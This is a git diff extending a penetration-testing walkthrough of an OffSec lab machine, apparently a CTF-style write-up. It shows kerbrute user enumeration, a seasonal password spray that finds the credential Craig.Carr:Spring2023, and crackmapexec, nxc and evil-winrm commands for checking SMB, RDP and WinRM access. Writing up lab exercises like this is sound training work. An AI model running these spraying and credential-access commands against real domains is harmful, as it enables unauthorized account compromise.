@@ -72,7 +72,8 @@ Making Wordlists
 
 I just copy these users name and save a file named users.txt
 
-<img width="427" height="545" alt="image" src="https://github.com/user-attachments/assets/063eb65f-b0a6-45ff-bdb7-d751a373093e" />
+<img width="367" height="666" alt="image" src="https://github.com/user-attachments/assets/eea418bb-8002-4b36-bc42-3c9fe4d09060" />
+
 
 now lets use the impacket script, GetNPUsers to check if any of the user’s are AS-REP roast vulnerable — Which turned out not.
 
@@ -85,3 +86,101 @@ impacket-GetNPUsers nagoya-industries.com/ -usersfile users.txt
 I used the impacket script, GetNPUsers to check if any of the user’s are AS-REP roast vulnerable — WHich turned out not.
 
 Also confirmed that the naming format is the correct one using kerbrute :
+
+```bash
+kerbrute userenum -d nagoya-industries.com --dc 192.168.55.21 users.txt
+```
+<img width="936" height="785" alt="image" src="https://github.com/user-attachments/assets/619d81a0-4972-435f-a8b5-3c9a5a60bffd" />
+
+So now we got valid users, but it’s too much to go through with rockyou.txt , I was honestly lost , but I knew the only way was to guess or brute force a password. I didn’t want to spend too much time and decided to use the first hint for the box in Offsec’s lab.
+
+<img width="828" height="42" alt="image" src="https://github.com/user-attachments/assets/46941be1-c600-4aea-b5d4-3886405f891f" />
+
+Are you serious, seasons + years lol.
+
+Okay OSINT-ing into this box was not my thought of process or methodology at all.
+
+<img width="1598" height="873" alt="image" src="https://github.com/user-attachments/assets/608c7ea0-bda3-461e-b465-1d4bef44adf3" />
+
+So with got a the year ‘2023’, now to guess the season.
+
+<img width="828" height="446" alt="image" src="https://github.com/user-attachments/assets/6214bf73-b359-42f7-b2fd-1f8b90a30854" />
+
+Let’s start with spring first. I’ll use kerbrute again to password spray the users :
+```bash
+kerbrute passwordspray --dc 192.168.55.21 -d nagoya-industries.com users.txt "spring2023"
+```
+<img width="1000" height="273" alt="image" src="https://github.com/user-attachments/assets/345b6c43-2927-4053-a9c4-49ae8fe699e8" />
+
+
+```bash
+note command later might be useful
+command with nxc to spray the usernames and passwords, and used grep "+" to filter out valid credentials:
+
+nxc smb 192.168.123.21 -u domUsers.txt -p pass.txt --continue-on-success | grep "+"
+```
+
+Didn’t work lol, let’s try with a capital s.
+<img width="990" height="296" alt="image" src="https://github.com/user-attachments/assets/a001b2e3-515f-4da7-85fb-500844512e59" />
+
+Got out first credential :
+
+Craig.Carr:Spring2023=
+
+Password Spraying
+
+Now that we had a set of matching creds we could go ahead and start spraying the creds to see what’s up.
+
+now let’s enumerate the user using crackmapexec :
+
+```bash
+crackmapexec smb 192.168.55.21 -u Craig.Carr -d nagoya-industries.com  -p "Spring2023" --shares
+```
+another command
+```bash
+nxc rdp nagoya -u 'craig.carr' -p 'Spring2023'
+```
+
+<img width="1057" height="247" alt="image" src="https://github.com/user-attachments/assets/49e1cd0c-766c-44de-9d0c-80bcbaa764b7" />
+
+Alright SMB works,
+
+I like to check if we can get a shell via winrm :
+
+crackmapexec smb 192.168.55.21 -u Craig.Carr -d nagoya-industries.com  -p "Spring2023"
+
+<img width="1056" height="101" alt="image" src="https://github.com/user-attachments/assets/ca6103ba-c98d-427a-8d2a-fcf503537a56" />
+
+I like to check if we can get a shell via winrm :
+
+```bash
+evil-winrm -i 192.168.55.21 -u craig.carr -p "Spring2023"
+```
+<img width="1254" height="281" alt="image" src="https://github.com/user-attachments/assets/c9eab2e9-321e-44af-831b-bd3f26a5db66" />
+
+No winrm access :(.
+
+Since we get SMB access let’s connect using SMBclient :
+
+<img width="909" height="68" alt="image" src="https://github.com/user-attachments/assets/027d751c-1a6f-4ade-9553-19b100c36434" />
+
+password as we know:  Spring2023
+
+<img width="856" height="788" alt="image" src="https://github.com/user-attachments/assets/37add856-386b-43e1-84bd-475c61240a2f" />
+
+Some of the files could potentially leak some information for us to pivot.
+
+I ended up getting them all and checking them out.
+
+to download file from smb to linux
+```bash
+get ResetPassword.exe.config
+```
+<img width="1255" height="89" alt="image" src="https://github.com/user-attachments/assets/0f88ba92-bb74-4407-a957-72af1f8ab620" />
+
+<img width="922" height="190" alt="image" src="https://github.com/user-attachments/assets/1162fdd2-1ce1-4dff-be7b-f877690f65b6" />
+
+
+
+
+
